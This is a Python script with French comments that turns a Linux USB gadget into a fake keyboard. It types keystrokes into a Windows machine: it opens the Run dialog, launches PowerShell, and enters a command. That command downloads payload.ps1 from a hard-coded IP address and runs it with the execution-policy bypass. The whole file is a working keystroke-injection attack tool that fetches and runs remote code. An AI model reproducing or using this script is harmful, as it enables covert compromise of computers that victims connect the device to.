#!/usr/bin/env python3
import time

HID = "/dev/hidg0"

# Mapping QWERTY US : caractere -> (scancode, shift)
QWERTY = {
    # Lettres minuscules
    'a': (0x04, False), 'b': (0x05, False), 'c': (0x06, False), 'd': (0x07, False),
    'e': (0x08, False), 'f': (0x09, False), 'g': (0x0A, False), 'h': (0x0B, False),
    'i': (0x0C, False), 'j': (0x0D, False), 'k': (0x0E, False), 'l': (0x0F, False),
    'm': (0x10, False), 'n': (0x11, False), 'o': (0x12, False), 'p': (0x13, False),
    'q': (0x14, False), 'r': (0x15, False), 's': (0x16, False), 't': (0x17, False),
    'u': (0x18, False), 'v': (0x19, False), 'w': (0x1A, False), 'x': (0x1B, False),
    'y': (0x1C, False), 'z': (0x1D, False),

    # Chiffres
    '1': (0x1E, False), '2': (0x1F, False), '3': (0x20, False), '4': (0x21, False),
    '5': (0x22, False), '6': (0x23, False), '7': (0x24, False), '8': (0x25, False),
    '9': (0x26, False), '0': (0x27, False),

    # Touches speciales
    ' ': (0x2C, False),
    '-': (0x2D, False),
    '=': (0x2E, False),
    '[': (0x2F, False),
    ']': (0x30, False),
    '\\': (0x31, False),
    ';': (0x33, False),
    "'": (0x34, False),
    '`': (0x35, False),
    ',': (0x36, False),
    '.': (0x37, False),
    '/': (0x38, False),

    # Majuscules
    'A': (0x04, True), 'B': (0x05, True), 'C': (0x06, True), 'D': (0x07, True),
    'E': (0x08, True), 'F': (0x09, True), 'G': (0x0A, True), 'H': (0x0B, True),
    'I': (0x0C, True), 'J': (0x0D, True), 'K': (0x0E, True), 'L': (0x0F, True),
    'M': (0x10, True), 'N': (0x11, True), 'O': (0x12, True), 'P': (0x13, True),
    'Q': (0x14, True), 'R': (0x15, True), 'S': (0x16, True), 'T': (0x17, True),
    'U': (0x18, True), 'V': (0x19, True), 'W': (0x1A, True), 'X': (0x1B, True),
    'Y': (0x1C, True), 'Z': (0x1D, True),

    # Symboles avec Shift
    '!': (0x1E, True), '@': (0x1F, True), '#': (0x20, True), '$': (0x21, True),
    '%': (0x22, True), '^': (0x23, True), '&': (0x24, True), '*': (0x25, True),
    '(': (0x26, True), ')': (0x27, True),
    '_': (0x2D, True), '+': (0x2E, True), '{': (0x2F, True), '}': (0x30, True),
    '|': (0x31, True), ':': (0x33, True), '"': (0x34, True), '~': (0x35, True),
    '<': (0x36, True), '>': (0x37, True), '?': (0x38, True),
}

def write_report(report):
    with open(HID, 'wb') as fd:
        fd.write(report)

def press_key(keycode, modifier=0x00):
    write_report(bytes([modifier, 0, keycode, 0, 0, 0, 0, 0]))
    time.sleep(0.005)
    write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
    time.sleep(0.005)

def type_char(char):
    if char in QWERTY:
        sc, shift = QWERTY[char]
        if shift:
            press_key(sc, 0x02)
        else:
            press_key(sc)
    else:
        # Fallback Alt+Numpad
        code = ord(char)
        digits = str(code)
        NUMPAD = {'0': 0x62, '1': 0x59, '2': 0x5A, '3': 0x5B, '4': 0x5C,
                  '5': 0x5D, '6': 0x5E, '7': 0x5F, '8': 0x60, '9': 0x61}
        write_report(bytes([0x04, 0, 0, 0, 0, 0, 0, 0]))
        time.sleep(0.02)
        for d in digits:
            write_report(bytes([0x04, 0, NUMPAD[d], 0, 0, 0, 0, 0]))
            time.sleep(0.02)
            write_report(bytes([0x04, 0, 0, 0, 0, 0, 0, 0]))
            time.sleep(0.02)
        write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        time.sleep(0.02)

def type_string(text):
    for char in text:
        type_char(char)

# === Injection ===
print("[*] HID Injection starting...")
time.sleep(2)

# Win + R
press_key(0x15, 0x08)
time.sleep(1.0)

# Ouvrir PowerShell
type_string("powershell")
time.sleep(0.1)
press_key(0x28)
time.sleep(1.5)

# Commande complete
cmd = "(New-Object Net.WebClient).DownloadFile('http://172.20.10.7:8080/payload.ps1','C:\\\\Users\\\\Public\\\\p.ps1');C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ep bypass -File C:\\\\Users\\\\Public\\\\p.ps1"

type_string(cmd)
time.sleep(0.2)
press_key(0x28)

print("[+] Commande injectee")
